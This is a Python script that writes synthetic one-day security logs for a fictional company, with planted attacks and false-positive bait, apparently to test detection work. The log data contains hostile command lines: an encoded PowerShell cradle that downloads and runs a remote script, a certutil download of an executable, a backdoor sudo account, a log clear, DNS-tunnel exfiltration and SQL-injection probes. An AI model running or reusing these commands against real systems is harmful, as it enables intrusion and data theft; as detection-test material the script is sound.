#!/usr/bin/env python3
# ruff: noqa: E501, S311, UP017
"""Synthetic logs for a small fake company ("Northwind Traders"), with three planted
attacks and deliberate false-positive bait. Deterministic (seeded), standard library only.

    python3 tools/seed/generate.py [--out sample-data] [--date YYYY-MM-DD]

Writes (all UTC, one business day):
    web01-auth.log      Linux auth.log (scenario 1, db01 backup bait, normal logins)
    db01-auth.log       Linux auth.log for the database server
    web01-access.log    nginx combined log (normal traffic + a scanner)
    windows-events.jsonl  Windows Security + Sysmon, evtx_dump JSON (scenarios 2 and 3)
    wazuh-alerts.json   a few Wazuh alerts from the same day
See docs/scenarios.md for what each scenario should produce.
"""

from __future__ import annotations

import argparse
import base64
import json
import random
from datetime import date, datetime, timedelta, timezone
from pathlib import Path

USERS = [
    "asmith",
    "bnkosi",
    "cdlamini",
    "dpillay",
    "emokoena",
    "fvanwyk",
    "gnaidoo",
    "hjacobs",
    "ikhumalo",
    "jdoe",
    "kmaseko",
    "lbotha",
    "mmhlongo",
    "nsithole",
    "oadams",
]
LINUX_USERS = ["deploy", "alice", "bob", "carol", "backup-svc"]
WS = {"asmith": "ws-02", "mmhlongo": "ws-03", "jdoe": "ws-04", "oadams": "ws-05"}
SID = "S-1-5-21-3623811015-3361044348-30300820"


def default_day() -> date:
    d = datetime.now(timezone.utc).date() - timedelta(days=1)
    while d.weekday() > 4:  # business-hours noise must land on a weekday
        d -= timedelta(days=1)
    return d


class Gen:
    def __init__(self, day: date) -> None:
        self.rnd = random.Random(1337)
        self.base = datetime(day.year, day.month, day.day, tzinfo=timezone.utc)
        self.web01: list[tuple[datetime, str]] = []
        self.db01: list[tuple[datetime, str]] = []
        self.access: list[tuple[datetime, str]] = []
        self.win: list[tuple[datetime, dict]] = []
        self.wazuh: list[tuple[datetime, dict]] = []

    def at(self, h: int, m: int = 0, s: int = 0) -> datetime:
        return self.base + timedelta(hours=h, minutes=m, seconds=s)

    # ---------------------------------------------------------------- linux
    def sys(self, bucket: list, ts: datetime, host: str, prog: str, pid: int, msg: str) -> None:
        stamp = f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S}"
        bucket.append(
            (ts, f"{stamp} {host} {prog}[{pid}]: {msg}" if pid else f"{stamp} {host} {prog}: {msg}")
        )

    def ssh_ok(self, bucket, ts, host, user, ip) -> None:
        pid = self.rnd.randint(1000, 30000)
        self.sys(
            bucket,
            ts,
            host,
            "sshd",
            pid,
            f"Accepted publickey for {user} from {ip} port {self.rnd.randint(40000, 60000)} ssh2",
        )
        self.sys(
            bucket,
            ts,
            host,
            "sshd",
            pid,
            f"pam_unix(sshd:session): session opened for user {user}(uid=1001) by (uid=0)",
        )

    def linux_noise(self) -> None:
        r = self.rnd
        for host, bucket in (("web01", self.web01), ("db01", self.db01)):
            for u in r.sample(LINUX_USERS[:4], 3):
                for _ in range(r.randint(2, 5)):
                    self.ssh_ok(
                        bucket,
                        self.at(8, 0) + timedelta(seconds=r.randint(0, 9 * 3600)),
                        host,
                        u,
                        f"10.0.1.{r.randint(10, 60)}",
                    )
            for _ in range(r.randint(2, 4)):  # fat-fingered password, then success
                t = self.at(9, 0) + timedelta(seconds=r.randint(0, 8 * 3600))
                u = r.choice(LINUX_USERS[:4])
                self.sys(
                    bucket,
                    t,
                    host,
                    "sshd",
                    4000,
                    f"Failed password for {u} from 10.0.1.{r.randint(10, 60)} port 50111 ssh2",
                )
                self.ssh_ok(bucket, t + timedelta(seconds=7), host, u, "10.0.1.22")
            for h in range(24):  # cron
                self.sys(
                    bucket,
                    self.at(h, 17),
                    host,
                    "CRON",
                    700 + h,
                    "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
                )
        for _ in range(4):  # sudo during business hours
            t = self.at(10) + timedelta(minutes=r.randint(0, 400))
            self.sys(
                self.web01,
                t,
                "web01",
                "sudo",
                0,
                "  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
            )

    # ---------------------------------------------------------------- scenario 1
    def scenario1(self) -> None:
        ip, h = "203.0.113.50", "web01"
        t = self.at(3, 11, 0)
        names = ["root", "admin", "ubuntu", "oracle", "postgres", "deploy", "git", "test"]
        for i in range(48):
            u = names[i % len(names)]
            ts = t + timedelta(seconds=i * 3)
            pid = 8000 + i
            if i % 5 == 0:
                self.sys(
                    self.web01, ts, h, "sshd", pid, f"Invalid user {u}x from {ip} port {50000 + i}"
                )
            self.sys(
                self.web01,
                ts,
                h,
                "sshd",
                pid,
                f"Failed password for {u} from {ip} port {50000 + i} ssh2",
            )
        ts = t + timedelta(minutes=3, seconds=20)
        self.sys(
            self.web01,
            ts,
            h,
            "sshd",
            8100,
            f"Accepted password for deploy from {ip} port 51000 ssh2",
        )
        self.sys(
            self.web01,
            ts,
            h,
            "sshd",
            8100,
            "pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
        )
        self.sys(
            self.web01,
            ts + timedelta(seconds=62),
            h,
            "sudo",
            0,
            "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupdate",
        )
        self.sys(
            self.web01,
            ts + timedelta(seconds=63),
            h,
            "useradd",
            8110,
            "new user: name=sysupdate, UID=1005, GID=1005, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/0",
        )
        self.sys(
            self.web01,
            ts + timedelta(seconds=95),
            h,
            "usermod",
            8111,
            "add 'sysupdate' to group 'sudo'",
        )
        self.sys(
            self.web01,
            ts + timedelta(seconds=95),
            h,
            "usermod",
            8111,
            "add 'sysupdate' to shadow group 'sudo'",
        )

    # ---------------------------------------------------------------- bait on db01
    def bait_linux(self) -> None:
        # Nightly backup job: sudo at 02:00, off hours, perfectly legitimate.
        self.sys(
            self.db01,
            self.at(2, 0, 3),
            "db01",
            "sudo",
            0,
            "  backup-svc : TTY=unknown ; PWD=/var/backups ; USER=root ; COMMAND=/usr/local/bin/nightly-backup.sh",
        )
        self.sys(
            self.db01,
            self.at(2, 0, 3),
            "db01",
            "sudo",
            0,
            "pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)",
        )

    # ---------------------------------------------------------------- windows
    def event(
        self, ts: datetime, host: str, provider: str, eid: int, data: dict, channel: str
    ) -> None:
        rec = {
            "Event": {
                "System": {
                    "Provider": {"#attributes": {"Name": provider}},
                    "EventID": eid,
                    "TimeCreated": {
                        "#attributes": {"SystemTime": ts.strftime("%Y-%m-%dT%H:%M:%S.%f0Z")}
                    },
                    "Channel": channel,
                    "Computer": f"{host.upper()}.northwind.local",
                },
                "EventData": data,
            }
        }
        self.win.append((ts, rec))

    def sec(self, ts, host, eid, data) -> None:
        self.event(ts, host, "Microsoft-Windows-Security-Auditing", eid, data, "Security")

    def sysmon(self, ts, host, eid, data) -> None:
        self.event(
            ts,
            host,
            "Microsoft-Windows-Sysmon",
            eid,
            {"RuleName": "-", "UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.000"), **data},
            "Microsoft-Windows-Sysmon/Operational",
        )

    def proc(self, ts, host, user, image, cmd, parent) -> None:
        self.sysmon(
            ts,
            host,
            1,
            {
                "ProcessId": str(self.rnd.randint(1000, 9999)),
                "Image": image,
                "CommandLine": cmd,
                "User": f"NORTHWIND\\{user}",
                "ParentImage": parent,
                "IntegrityLevel": "Medium",
            },
        )

    def windows_noise(self) -> None:
        r = self.rnd
        for u in USERS:
            host = WS.get(u, f"ws-{(USERS.index(u) % 8) + 6:02d}")
            t = self.at(8, r.randint(0, 40), r.randint(0, 59))
            self.sec(
                t,
                host,
                4624,
                {
                    "TargetUserName": u,
                    "TargetDomainName": "NORTHWIND",
                    "LogonType": "2",
                    "IpAddress": "-",
                    "ProcessName": "C:\\Windows\\System32\\winlogon.exe",
                    "TargetUserSid": f"{SID}-{1100 + USERS.index(u)}",
                },
            )
            for _ in range(r.randint(4, 9)):
                ts = self.at(8, 30) + timedelta(seconds=r.randint(0, 9 * 3600))
                app = r.choice(
                    [
                        (
                            "chrome.exe",
                            "C:\\Program Files\\Google\\Chrome\\chrome.exe",
                            "explorer.exe",
                        ),
                        (
                            "outlook.exe",
                            "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                            "explorer.exe",
                        ),
                        (
                            "excel.exe",
                            "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                            "explorer.exe",
                        ),
                        ("splwow64.exe", "C:\\Windows\\splwow64.exe", "winword.exe"),
                        (
                            "teams.exe",
                            "C:\\Users\\x\\AppData\\Local\\Microsoft\\Teams\\Teams.exe",
                            "explorer.exe",
                        ),
                    ]
                )
                self.proc(ts, host, u, app[1], app[0], f"C:\\Windows\\{app[2]}")
            for _ in range(r.randint(10, 25)):
                ts = self.at(8, 30) + timedelta(seconds=r.randint(0, 9 * 3600))
                dom = r.choice(
                    [
                        "www.google.com",
                        "outlook.office365.com",
                        "login.microsoftonline.com",
                        "teams.microsoft.com",
                        "cdn.jsdelivr.net",
                        "northwind.local",
                        "update.googleapis.com",
                    ]
                )
                self.sysmon(
                    ts,
                    host,
                    22,
                    {
                        "ProcessId": "4120",
                        "QueryName": dom,
                        "QueryStatus": "0",
                        "QueryResults": "type: 1 10.0.0.1;",
                        "Image": "C:\\Program Files\\Google\\Chrome\\chrome.exe",
                        "User": f"NORTHWIND\\{u}",
                    },
                )
        # Domain admin logs on interactively during the day: 4672 is expected and quiet.
        self.sec(
            self.at(9, 5),
            "dc01",
            4672,
            {
                "SubjectUserName": "adm-pillay",
                "SubjectDomainName": "NORTHWIND",
                "SubjectUserSid": f"{SID}-1500",
                "PrivilegeList": "SeDebugPrivilege SeBackupPrivilege",
            },
        )

    def bait_windows(self) -> None:
        # Helpdesk creates a contractor account at 10:30 (approved ticket) → "new account" FP.
        self.sec(
            self.at(10, 30, 12),
            "ws-03",
            4720,
            {
                "TargetUserName": "contractor1",
                "TargetDomainName": "WS-03",
                "TargetSid": f"{SID}-2001",
                "SubjectUserName": "mmhlongo",
                "SubjectDomainName": "NORTHWIND",
            },
        )
        self.sec(
            self.at(10, 30, 15),
            "ws-03",
            4732,
            {
                "MemberName": "-",
                "MemberSid": f"{SID}-2001",
                "TargetUserName": "Users",
                "TargetDomainName": "Builtin",
                "SubjectUserName": "mmhlongo",
                "SubjectDomainName": "NORTHWIND",
            },
        )
        # IT admin checks a certificate revocation list with certutil → matches the download rule.
        self.proc(
            self.at(11, 42),
            "ws-05",
            "oadams",
            "C:\\Windows\\System32\\certutil.exe",
            "certutil.exe -verifyctl -f -split http://crl.northwind.local/root.crl",
            "C:\\Windows\\System32\\cmd.exe",
        )

    # ---------------------------------------------------------------- scenario 2
    def scenario2(self) -> None:
        h, u = "ws-04", "jdoe"
        ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        word = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
        payload = base64.b64encode(
            "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/s.ps1')".encode(
                "utf-16-le"
            )
        ).decode()
        t = self.at(14, 3)
        self.proc(
            t,
            h,
            u,
            word,
            '"WINWORD.EXE" /n "C:\\Users\\jdoe\\Downloads\\Invoice_4471.docm"',
            "C:\\Windows\\explorer.exe",
        )
        self.proc(
            t + timedelta(seconds=11),
            h,
            u,
            ps,
            f"powershell.exe -NoP -W Hidden -enc {payload}",
            word,
        )
        self.sysmon(
            t + timedelta(seconds=13),
            h,
            3,
            {
                "ProcessId": "5120",
                "Image": ps,
                "User": f"NORTHWIND\\{u}",
                "SourceIp": "10.0.2.44",
                "SourcePort": "51234",
                "DestinationIp": "203.0.113.80",
                "DestinationPort": "80",
                "Protocol": "tcp",
                "Initiated": "true",
            },
        )
        self.proc(
            t + timedelta(seconds=40),
            h,
            u,
            "C:\\Windows\\System32\\certutil.exe",
            "certutil.exe -urlcache -split -f http://203.0.113.80/a.exe C:\\Users\\Public\\a.exe",
            ps,
        )
        self.sysmon(
            t + timedelta(seconds=44),
            h,
            11,
            {
                "ProcessId": "5188",
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "TargetFilename": "C:\\Users\\Public\\a.exe",
                "User": f"NORTHWIND\\{u}",
            },
        )
        self.sec(
            t + timedelta(minutes=8),
            h,
            4720,
            {
                "TargetUserName": "helpdesk2",
                "TargetDomainName": "WS-04",
                "TargetSid": f"{SID}-2002",
                "SubjectUserName": u,
                "SubjectDomainName": "NORTHWIND",
            },
        )
        self.sec(
            t + timedelta(minutes=8, seconds=4),
            h,
            4732,
            {
                "MemberName": "-",
                "MemberSid": f"{SID}-2002",
                "TargetUserName": "Administrators",
                "TargetDomainName": "Builtin",
                "SubjectUserName": u,
                "SubjectDomainName": "NORTHWIND",
            },
        )
        self.sec(
            t + timedelta(minutes=17),
            h,
            1102,
            {
                "SubjectUserName": u,
                "SubjectDomainName": "NORTHWIND",
                "SubjectUserSid": f"{SID}-1109",
                "SubjectLogonId": "0x3e7",
            },
        )

    # ---------------------------------------------------------------- scenario 3
    def scenario3(self) -> None:
        h, u = "ws-02", "asmith"
        t = self.at(15, 40)
        for i in range(200):
            blob = base64.urlsafe_b64encode(self.rnd.randbytes(36)).decode().rstrip("=")
            self.sysmon(
                t + timedelta(seconds=i * 1.2),
                h,
                22,
                {
                    "ProcessId": "6004",
                    "QueryName": f"{blob}.{i % 9}.exfil-example.net",
                    "QueryStatus": "0",
                    "QueryResults": "type: 5 ns1.exfil-example.net;",
                    "Image": "C:\\Users\\asmith\\AppData\\Local\\Temp\\upd.exe",
                    "User": f"NORTHWIND\\{u}",
                },
            )

    # ---------------------------------------------------------------- web + wazuh
    def web(self) -> None:
        r = self.rnd
        paths = [
            "/",
            "/products",
            "/products/42",
            "/cart",
            "/login",
            "/static/app.js",
            "/static/site.css",
            "/api/orders",
            "/contact",
        ]
        for _ in range(450):
            ts = self.at(7) + timedelta(seconds=r.randint(0, 12 * 3600))
            ip = f"198.51.{r.randint(1, 99)}.{r.randint(2, 250)}"
            st = r.choices([200, 304, 404, 500], [80, 12, 6, 2])[0]
            self.line(
                ts,
                ip,
                f"GET {r.choice(paths)} HTTP/1.1",
                st,
                r.randint(200, 90000),
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
            )
        t = self.at(12, 20)  # a scanner: noisy but unrelated to the host attacks
        for i, p in enumerate(
            [
                "/admin",
                "/wp-login.php",
                "/products.php?id=1%27%20OR%201=1--",
                "/../../etc/passwd",
                "/phpmyadmin/",
            ]
        ):
            self.line(
                t + timedelta(seconds=i),
                "198.51.100.7",
                f"GET {p} HTTP/1.1",
                404,
                162,
                "sqlmap/1.8.4#stable (https://sqlmap.org)",
            )

    def line(self, ts, ip, req, status, size, ua) -> None:
        self.access.append(
            (ts, f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0000] "{req}" {status} {size} "-" "{ua}"')
        )

    def wazuh_alerts(self) -> None:
        def alert(ts, level, rid, desc, agent, extra) -> None:
            self.wazuh.append(
                (
                    ts,
                    {
                        "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.000+0000"),
                        "rule": {
                            "level": level,
                            "description": desc,
                            "id": rid,
                            "groups": ["syslog"],
                        },
                        "agent": {"id": "001", "name": agent},
                        "manager": {"name": "wazuh"},
                        "decoder": {"name": "sshd"},
                        **extra,
                    },
                )
            )

        alert(
            self.at(3, 12),
            10,
            "5712",
            "sshd: brute force trying to get access to the system.",
            "web01",
            {
                "data": {"srcip": "203.0.113.50"},
                "full_log": "Oct 20 03:12:00 web01 sshd[8003]: Failed password for root from 203.0.113.50 port 50003 ssh2",
            },
        )
        alert(
            self.at(14, 11),
            12,
            "92057",
            "Sysmon - Suspicious Process - PowerShell encoded command",
            "ws-04",
            {
                "data": {
                    "win": {
                        "system": {
                            "providerName": "Microsoft-Windows-Sysmon",
                            "eventID": "1",
                            "computer": "WS-04.northwind.local",
                            "systemTime": self.at(14, 11).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                            "channel": "Microsoft-Windows-Sysmon/Operational",
                        },
                        "eventdata": {
                            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
                            "commandLine": "powershell.exe -NoP -W Hidden -enc SQBFAFgA",
                            "parentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE",
                            "user": "NORTHWIND\\\\jdoe",
                        },
                    }
                }
            },
        )

    def build(self) -> None:
        self.linux_noise()
        self.scenario1()
        self.bait_linux()
        self.windows_noise()
        self.bait_windows()
        self.scenario2()
        self.scenario3()
        self.web()
        self.wazuh_alerts()


def write(path: Path, rows: list, fmt) -> int:
    rows.sort(key=lambda r: r[0])
    path.write_text("".join(fmt(r) + "\n" for r in rows), encoding="utf-8")
    return len(rows)


def generate(out: Path, day: date) -> dict[str, int]:
    g = Gen(day)
    g.build()
    out.mkdir(parents=True, exist_ok=True)
    return {
        "web01-auth.log": write(out / "web01-auth.log", g.web01, lambda r: r[1]),
        "db01-auth.log": write(out / "db01-auth.log", g.db01, lambda r: r[1]),
        "web01-access.log": write(out / "web01-access.log", g.access, lambda r: r[1]),
        "windows-events.jsonl": write(
            out / "windows-events.jsonl", g.win, lambda r: json.dumps(r[1], separators=(",", ":"))
        ),
        "wazuh-alerts.json": write(
            out / "wazuh-alerts.json", g.wazuh, lambda r: json.dumps(r[1], separators=(",", ":"))
        ),
    }


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--out", type=Path, default=Path("sample-data"))
    ap.add_argument("--date", type=date.fromisoformat, default=default_day())
    a = ap.parse_args()
    for name, n in generate(a.out, a.date).items():
        print(f"{a.out / name}: {n} records")
    print(f"day: {a.date} (UTC)")
